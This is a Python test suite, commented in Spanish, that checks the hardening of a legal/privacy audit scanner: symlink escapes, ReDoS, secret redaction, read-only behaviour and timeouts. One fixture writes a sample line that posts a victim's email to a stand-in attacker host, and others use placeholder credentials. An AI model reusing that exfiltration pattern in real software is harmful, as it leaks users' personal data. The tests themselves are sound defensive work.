#!/usr/bin/env python3
"""Tests del endurecimiento (ALTA/MEDIA) de los detectores de legal-audit.

Cada test es la regresión de un bug que destapó el probe de hardening:

  T1/T2  symlinks: un symlink (archivo o directorio) que resuelve FUERA del
         root jamás se lee, y `simlinks_omitidos` lo cuenta (BUG-2 incluido:
         los symlinks de directorio también suman).
  T3     ReDoS: `_DECL_RE`, `_AGE_FIELD_RE` y `_iter_age_cmps` corren en
         tiempo lineal sobre líneas largas de 100K espacios / 100K `x`.
  T4     corpus/ es un negativo limpio para minors_and_voice (0 hallazgos;
         en particular 0 ALTA). Los fixtures NO pueden contener las
         palabras-faro de los detectores ni siquiera en comentarios (BUG-4).
  T5     secretos: excluidos por defecto (a) y escaneables con
         `--include-secrets` — `.env` incluido pese a no tener sufijo (b).
  T6     redacción: el VALOR del secreto se reemplaza por `[REDACTED]`;
         la clave y el número de línea se conservan.
  T7     D12: el campo de triage es `prioridad_revision` (nunca `por_severidad`)
         y `severidad_legal` es siempre null.
  T8     read-only: `--json` dentro del repo auditado se rechaza (exit≠0).
  T9     read-only: scan.py no crea ni modifica archivos en el árbol auditado.
  T10    timeout por detector: un detector que cuelga no aborta el scan.
  T11    un banner requiere un marcador real: "accept"/"ok"/header `Accept:`
         en prosa no son un banner de cookies.
  extra  BUG-3: `credentials.py` es secreto (no se escanea por defecto) y
         `credentials_manager.py` NO lo es (es código).

Shim por env var (mismo patrón que test_verify_pack.py) para correr contra una
implementación mutada:

    LEGAL_AUDIT_SCRIPTS=/tmp/mutado/skills/legal-audit/scripts \
        python3 -m unittest tests.test_hardening

Los fixtures viven en `tests/fixtures/hardening/` (los reutiliza, no los crea).
Solo stdlib. Sin red.
"""

from __future__ import annotations

import contextlib
import importlib.util
import io
import json
import os
import re
import shutil
import signal
import subprocess
import sys
import tempfile
import time
import types
import unittest
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parents[1]
DEFAULT_SCRIPTS = REPO_ROOT / "skills" / "legal-audit" / "scripts"
SCRIPTS_DIR = Path(os.environ.get("LEGAL_AUDIT_SCRIPTS", str(DEFAULT_SCRIPTS))).resolve()
DETECTORS_DIR = SCRIPTS_DIR / "detectors"
SCAN_PY = SCRIPTS_DIR / "scan.py"

HARDENING = REPO_ROOT / "tests" / "fixtures" / "hardening"
FIX_CORPUS = HARDENING / "corpus"
FIX_SECRETS = HARDENING / "secrets"
FIX_BANNER = HARDENING / "banner_no_marker"
FIX_TIMEOUT = HARDENING / "timeout"
FIX_REDACTION = HARDENING / "redaction"

# Código benigno para los roots temporales de los tests de symlinks.
BENIGN_APP = "x = 1\n\nprint(x)\n"

# --- carga de la implementación bajo prueba (shim) --------------------------
_MODULES: dict[str, object] = {}
_COMMON: object | None = None


def _load_common():
    """Carga `common` del árbol bajo prueba (no del que haya importado otro test)."""
    global _COMMON
    if _COMMON is not None:
        return _COMMON
    sys.path.insert(0, str(DETECTORS_DIR))
    sys.modules.pop("common", None)  # el `common` de otro test no debe colarse
    import common as common_mod  # noqa: PLC0415
    _COMMON = common_mod
    return common_mod


def _load_detector(name: str):
    """Detector cargado por path (como scan.py), cacheado por test."""
    if name in _MODULES:
        return _MODULES[name]
    _load_common()
    path = DETECTORS_DIR / f"{name}.py"
    spec = importlib.util.spec_from_file_location(f"harden.{name}", path)
    if spec is None or spec.loader is None:
        raise RuntimeError(f"no se pudo cargar {path}")
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    _MODULES[name] = mod
    return mod


def _load_scan_module():
    """scan.py como módulo (necesario para T10: inyectar el detector lento)."""
    spec = importlib.util.spec_from_file_location("harden_scan", SCAN_PY)
    if spec is None or spec.loader is None:
        raise RuntimeError(f"no se pudo cargar {SCAN_PY}")
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


# --- ejecución de scan.py y helpers de inspección ---------------------------

def _run_scan(target: Path, *extra: str) -> tuple[int, str]:
    proc = subprocess.run(
        [sys.executable, str(SCAN_PY), str(target), *extra],
        capture_output=True, text=True, timeout=180,
    )
    return proc.returncode, proc.stdout + proc.stderr


def _scan_json(target: Path, *extra: str) -> tuple[dict, str]:
    """Corre scan.py y devuelve (payload JSON, salida cruda)."""
    rc, out = _run_scan(target, *extra)
    assert rc == 0, f"scan.py falló (rc={rc}):\n{out}"
    start = out.find("{")
    assert start != -1, f"sin JSON en la salida de scan.py:\n{out}"
    return json.loads(out[start:]), out


def _max_metric(data: dict, key: str) -> int:
    best = 0
    for metrics in data["resumen"]["metricas_por_detector"].values():
        best = max(best, int(metrics.get(key, 0)))
    return best


def _snapshot_tree(root: Path) -> dict[str, tuple[int, int]]:
    """{(relpath): (mtime_ns, size)} de todo archivo bajo `root`."""
    out: dict[str, tuple[int, int]] = {}
    for p in sorted(root.rglob("*")):
        if p.is_file():
            st = p.stat()
            out[str(p.relative_to(root))] = (st.st_mtime_ns, st.st_size)
    return out


@contextlib.contextmanager
def _symlink_workspace(name: str):
    """Raíz temporal aislada: `tmp/root` (auditado) + `tmp/outside` (no-auditado)."""
    tmp = Path(tempfile.mkdtemp(prefix=f"harden_{name}_"))
    root = tmp / "root"
    outside = tmp / "outside"
    root.mkdir()
    outside.mkdir()
    try:
        yield root, outside
    finally:
        shutil.rmtree(tmp, ignore_errors=True)


class HardeningTests(unittest.TestCase):
    """Regresiones del probe de hardening contra tests/fixtures/hardening/."""

    # --- T1/T2: no-leak de symlinks ---------------------------------------

    def test_symlink_file_no_leaked(self):
        """Un symlink de ARCHIVO que resuelve fuera del root no se lee y cuenta.

        Si se siguiera, el archivo externo (con una credencial AWS y un email)
        aparecería en el JSON del scan. Además, `simlinks_omitidos` debe
        contarlo (métrica honesta, BUG-2/ALTA-1).
        """
        with _symlink_workspace("file_symlink") as (root, outside):
            (outside / "leak.py").write_text(
                'logger.info("user email=leak-t1@example.com ak=AKIAIOSFODNN7EXAMPLE")\n',
                encoding="utf-8",
            )
            (root / "app.py").write_text(BENIGN_APP, encoding="utf-8")
            os.symlink(outside / "leak.py", root / "leak.py")

            data, raw = _scan_json(root)

        self.assertNotIn("AKIAIOSFODNN7EXAMPLE", raw,
                         "el valor de un archivo fuera del root se filtró al JSON")
        self.assertNotIn("leak-t1@example.com", raw,
                         "el contenido de un archivo fuera del root se filtró al JSON")
        self.assertGreaterEqual(
            _max_metric(data, "simlinks_omitidos"), 1,
            "el symlink de archivo omitido no se contó en simlinks_omitidos",
        )

    def test_symlink_dir_not_followed(self):
        """Un symlink de DIRECTORIO no se desciende; un symlink de archivo que
        resuelve fuera no se lee — y AMBOS se cuentan en `simlinks_omitidos`.

        El destino externo contiene el cruce email → sink: si se escaneara,
        habría un hallazgo con path del symlinked dir y el email en el JSON.
        """
        with _symlink_workspace("dir_symlink") as (root, outside):
            outside_dir = outside / "outside_dir"
            outside_dir.mkdir()
            (outside_dir / "secret.txt").write_text("contenido fuera del root\n", encoding="utf-8")
            (outside / "leak_sink.py").write_text(
                'email = "victim@example.com"\n'
                'def notify():\n'
                '    requests.post("https://collect.evil-example.com/hook", '
                'json={"email": email})\n'
                '    logger.info("user email=victim@example.com")\n',
                encoding="utf-8",
            )
            (root / "app.py").write_text(BENIGN_APP, encoding="utf-8")
            os.symlink(outside_dir, root / "data", target_is_directory=True)
            (root / "config").mkdir()
            os.symlink(outside / "leak_sink.py", root / "config" / "leak_sink.py")

            data, raw = _scan_json(root)

        self.assertNotIn("victim@example.com", raw,
                         "el contenido de un directorio/archivo externo se filtró al JSON")
        for h in data["hallazgos"]:
            # `abs_to_rel` devuelve el path absoluto del symlink cuando el
            # destino escapa del root: cae en el ==/contains, no en startswith.
            self.assertFalse(
                "leak_sink.py" in h["archivo"]
                or h["archivo"].startswith("data")
                or "/data/" in h["archivo"],
                f"hallazgo con path del symlinked dir: {h['archivo']}",
            )
        # BUG-2: el symlink de directorio también se cuenta (1 dir + 1 archivo).
        self.assertGreaterEqual(
            _max_metric(data, "simlinks_omitidos"), 2,
            "se esperaban ≥2 simlinks omitidos (dir + archivo); la métrica no lo refleja",
        )

    # --- T3: ReDoS ---------------------------------------------------------

    def test_redos_timing(self):
        """Los patrones endurecidos no hacen backtracking polinomial.

        Una línea de 100K espacios / 100K `x` contra `_DECL_RE`,
        `_iter_age_cmps` y `_AGE_FIELD_RE` debe resolver en < 1 s cada una.
        """
        pii_sinks = _load_detector("pii_sinks")
        minors = _load_detector("minors_and_voice")
        spaces = " " * 100_000
        x100 = "x" * 100_000

        cases = [
            ("_DECL_RE@spaces", lambda p=pii_sinks: list(p._DECL_RE.finditer(spaces))),
            ("_DECL_RE@x100", lambda p=pii_sinks: list(p._DECL_RE.finditer(x100))),
            ("_AGE_FIELD_RE@spaces", lambda m=minors: m._AGE_FIELD_RE.search(spaces)),
            ("_AGE_FIELD_RE@x100", lambda m=minors: m._AGE_FIELD_RE.search(x100)),
            ("_iter_age_cmps@spaces", lambda m=minors: m._iter_age_cmps(spaces)),
            ("_iter_age_cmps@x100", lambda m=minors: m._iter_age_cmps(x100)),
        ]
        for label, fn in cases:
            t0 = time.perf_counter()
            fn()
            elapsed = time.perf_counter() - t0
            self.assertLess(
                elapsed, 1.0,
                f"{label} tardó {elapsed:.3f}s (> 1s): posible backtracking polinomial",
            )

    # --- T4: corpus sin falsos positivos -----------------------------------

    def test_corpus_no_false_alta(self):
        """El corpus de prosa (voice/age/AI en texto, código neutro) es un
        negativo limpio: minors_and_voice no emite NINGÚN hallazgo (en
        particular, cero ALTA). Ver TODO el archivo del fixture, incluidos los
        comentarios (BUG-4): los detectores escanean el archivo completo.
        """
        findings = _load_detector("minors_and_voice").scan(FIX_CORPUS)
        self.assertEqual(
            findings, [],
            "el corpus es un negativo limpio; no debe producir hallazgos",
        )

    # --- T5a/T5b: exclusiones de secretos e --include-secrets --------------

    def test_secret_files_excluded_by_default(self):
        """Por defecto los archivos cuyo contenido ES un secreto (.env, id_rsa,
        cert.pem, id_rsa.py) se excluyen del scan y su valor jamás sale.
        """
        data, raw = _scan_json(FIX_SECRETS)
        archivos = {h["archivo"] for h in data["hallazgos"]}
        for secreto in (".env", "id_rsa", "cert.pem", "id_rsa.py"):
            self.assertNotIn(
                secreto, archivos,
                f"el archivo-secreto {secreto!r} se escaneó por defecto",
            )
        self.assertNotIn("sk-secretvalue123", raw,
                         "el valor de un secreto salió en la salida por defecto")

    def test_include_secrets_flag_enables_env(self):
        """BUG-1: `--include-secrets` habilita el escaneo de `.env` aunque
        `Path('.env').suffix` sea '' (el filtro de extensiones no debe poder
        con él). Hoy este test falla sin el fix, y lo valida.
        """
        data, _raw = _scan_json(FIX_SECRETS, "--include-secrets")
        archivos = [h["archivo"] for h in data["hallazgos"]]
        self.assertIn(
            ".env", archivos,
            f"`.env` no aparece en hallazgos con --include-secrets; {archivos!r}",
        )

    # --- T6: redacción ------------------------------------------------------

    def test_redaction_preserves_key_and_line(self):
        """D11: el VALOR de un secreto en evidencia/mensaje se reemplaza por
        [REDACTED], pero la clave (`api_key`) y la línea (14) se conservan.
        """
        findings = _load_detector("pii_in_logs").scan(FIX_REDACTION)
        hits = [h for h in findings if "api_key" in h.evidencia]
        self.assertTrue(hits, "el fixture de redacción no produjo hallazgo con api_key")
        h = hits[0]
        self.assertEqual(h.archivo, "app.py")
        self.assertEqual(h.linea, 14)
        self.assertIn("[REDACTED]", h.evidencia)
        self.assertNotIn("sk-secretvalue123", h.evidencia)
        # el valor tampoco debe salir en el JSON agregado del scan completo
        _data, raw = _scan_json(FIX_REDACTION)
        self.assertNotIn("sk-secretvalue123", raw,
                         "el valor del secreto apareció en la salida JSON")

    # --- T7: renombre severidad -> prioridad_revision -----------------------

    def test_severity_rename_complete(self):
        """D12: el resumen usa `por_prioridad_revision` (no `por_severidad`) y
        cada hallazgo lleva `severidad_legal: null`.
        """
        data, _raw = _scan_json(FIX_TIMEOUT)
        self.assertIn("por_prioridad_revision", data["resumen"])
        self.assertNotIn("por_severidad", data["resumen"])
        self.assertTrue(data["hallazgos"], "fixture timeout sin hallazgos: nada que validar")
        for h in data["hallazgos"]:
            self.assertIsNone(
                h.get("severidad_legal"),
                f"hallazgo con severidad_legal no nulo: {h.get('archivo')}:{h.get('linea')}",
            )
            self.assertIn("prioridad_revision", h)

    # --- T8/T9: read-only ---------------------------------------------------

    def test_json_output_rejected_inside_target(self):
        """`--json` dentro del repo auditado se rechaza: no crea el archivo y
        el proceso sale con código ≠ 0 (read-only en el target).
        """
        with tempfile.TemporaryDirectory(prefix="harden_json_") as td:
            target = Path(td) / "target"
            shutil.copytree(FIX_CORPUS, target)
            out_inside = target / "salida.json"
            rc, out = _run_scan(target, "--json", str(out_inside))
        self.assertNotEqual(rc, 0, f"scan --json dentro del target no se rechazó:\n{out}")
        self.assertFalse(out_inside.exists(),
                         "scan.py creó el archivo de salida dentro del repo auditado")

    def test_read_only_no_files_created(self):
        """scan.py sobre el árbol hardening completo no crea ni modifica nada:
        paths, mtimes y tamaños idénticos antes y después.
        """
        before = _snapshot_tree(HARDENING)
        rc, out = _run_scan(HARDENING)
        self.assertEqual(rc, 0, f"scan.py falló:\n{out}")
        after = _snapshot_tree(HARDENING)
        self.assertEqual(
            sorted(after), sorted(before),
            "scan.py creó o eliminó archivos en el árbol auditado",
        )
        for rel in before:
            self.assertEqual(after[rel], before[rel],
                             f"scan.py modificó {rel} (mtime/tamaño)")

    # --- T10: timeout por detector -----------------------------------------

    @unittest.skipUnless(hasattr(signal, "SIGALRM"), "SIGALRM es Unix-only")
    def test_timeout_does_not_abort_scan(self):
        """Un detector que excede el tope se registra en `errores` como
        `timeout: <detector>` y los demás detectores siguen corriendo.
        El fixture timeout/ tiene el cruce email → sink para demostrar que
        pii_sinks sí corre.
        """
        scan_mod = _load_scan_module()
        real_load = scan_mod._load_detector

        def slow_security_config(_root):
            time.sleep(30)  # más que DETECTOR_TIMEOUT_SEG (mutado abajo)

        def fake_load(name):
            if name == "security_config":
                # `__name__` lo usa scan.py para el mensaje de timeout.
                return types.SimpleNamespace(
                    __name__="security_config",
                    scan=slow_security_config,
                    COVERED_OBLIGACIONES={"gdpr-art-25", "gdpr-art-32"},
                )
            return real_load(name)

        old_timeout = scan_mod.DETECTOR_TIMEOUT_SEG
        scan_mod.DETECTOR_TIMEOUT_SEG = 1  # no esperar 60 s reales
        scan_mod._load_detector = fake_load
        try:
            buf, err = io.StringIO(), io.StringIO()
            with contextlib.redirect_stdout(buf), contextlib.redirect_stderr(err):
                rc = scan_mod.main(["scan.py", str(FIX_TIMEOUT)])
        finally:
            scan_mod._load_detector = real_load
            scan_mod.DETECTOR_TIMEOUT_SEG = old_timeout

        self.assertEqual(rc, 0)
        out = buf.getvalue()
        start = out.find("{")
        self.assertNotEqual(start, -1, f"sin JSON en salida:\n{out}")
        data = json.loads(out[start:])
        self.assertIn("timeout: security_config", data["errores"],
                      f"falta el timeout en errores: {data['errores']!r}")
        self.assertGreaterEqual(
            data["resumen"]["por_detector"].get("pii_sinks", 0), 1,
            "pii_sinks no corrió: el timeout de security_config abortó el scan",
        )

    # --- T11: banner requiere marcador --------------------------------------

    def test_banner_requires_marker(self):
        """Prosa con 'accept'/'ok' y un header `Accept:` NO es un banner de
        cookies: sin marcador (id/class de banner), consent_flow no emite
        ningún hallazgo (regresión de los 244 FPs de express).
        """
        findings = _load_detector("consent_flow").scan(FIX_BANNER)
        self.assertEqual(
            findings, [],
            "un banner sin marcador real no debe reportarse como banner",
        )

    # --- extra (BUG-3): credentials.py es secreto, credentials_manager.py no -

    def test_credentials_py_is_secret(self):
        """BUG-3: `credentials.py` (nombre base sin extensión = credentials) ES
        un archivo-secreto y no se escanea por defecto; `credentials_manager.py`
        no lo es (es código) y SÍ se escanea. El match es por NOMBRE, no por ruta.
        """
        with tempfile.TemporaryDirectory(prefix="harden_creds_") as td:
            root = Path(td)
            (root / "credentials.py").write_text("password = 'secreto'\n", encoding="utf-8")
            (root / "credentials_manager.py").write_text("password = 'secreto'\n", encoding="utf-8")
            names = sorted(p.name for p in _load_common().iter_source_files(root))
        self.assertNotIn("credentials.py", names,
                         "credentials.py se escaneó por defecto (BUG-3)")
        self.assertIn("credentials_manager.py", names,
                      "credentials_manager.py es código y no debe excluirse")


if __name__ == "__main__":
    unittest.main()